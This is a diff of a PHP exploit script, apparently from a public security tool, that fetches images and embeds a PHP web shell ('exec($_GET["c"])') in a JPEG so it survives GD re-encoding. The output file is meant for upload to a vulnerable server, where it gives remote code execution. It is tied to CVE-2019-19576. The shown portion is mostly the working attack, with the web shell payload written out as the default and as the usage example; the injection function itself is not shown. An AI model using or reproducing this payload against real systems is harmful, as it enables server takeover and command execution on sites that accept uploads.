@@ -1,32 +1,34 @@
 <?php
-#Title: jpeg payload generator for file upload RCE
+#Title: Tool to inject code into JPEG that has been stuffed through imagecreatefromjpeg in PHP
 #Author: Jinny Ramsmark
-#Github: https://github.com/jra89/CVE-2019-19576
-#Other: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-19576
-#Usage: php inject.php
-#Output: image.jpg.phar is the file to be used for upload and exploitation
+#Github: https://github.com/jra89/Jellypeg
+#Usage: php jellypeg.php
+#Output: image.jpg.php is the file to be used for upload and exploitation
+#Requires: php, php-gd
 
 #This script assumes no special transforming is done on the image for this specific CVE.
 #It can be modified however for different sizes and so on (x,y vars).
 
 ini_set('display_errors', 1);
 error_reporting(E_PARSE);
-#requires php, php-gd
- 
-$orig = 'image.jpg';
-$code = '<?=exec($_GET["c"])?>';
-$quality = "85";
-$base_url = "http://placekitten.com";
- 
+
 echo "-=Imagejpeg injector 1.9=-\n";
+echo "[+] Usage: php jellypeg.php <width> <height> <quality> <code>\n";
+echo "[+] Example: php jellypeg.php 100 100 75 '<?=exec(\$_GET[\"c\"])?>'\n";
+
+//Argue(ment) about stuff, I dunno, I thought it was funny
+$width = isset($argv[1]) && is_numeric($argv[1]) ? $argv[1] : '100';
+$height = isset($argv[2]) && is_numeric($argv[2]) ? $argv[2] : '100';
+$quality = isset($argv[3]) && is_numeric($argv[3]) && $argv[3] <= 100 ? $argv[3] : '75';
+$code = isset($argv[4]) ? $argv[4 ] : '<?=exec($_GET["c"])?>';
+$orig = 'image.jpg';
+$base_url = "http://placekitten.com";
  
 do
 {
-    $x = 100;
-    $y = 100;
-    $url = $base_url . "/$x/$y/";
+    $url = $base_url . "/$width/$height/";
  
-    echo "[+] Fetching image ($x X $y) from $url\n";
+    echo "[+] Fetching image ($width X $height) from $url\n";
     file_put_contents($orig, file_get_contents($url));
 } while(!tryInject($orig, $code, $quality));
  
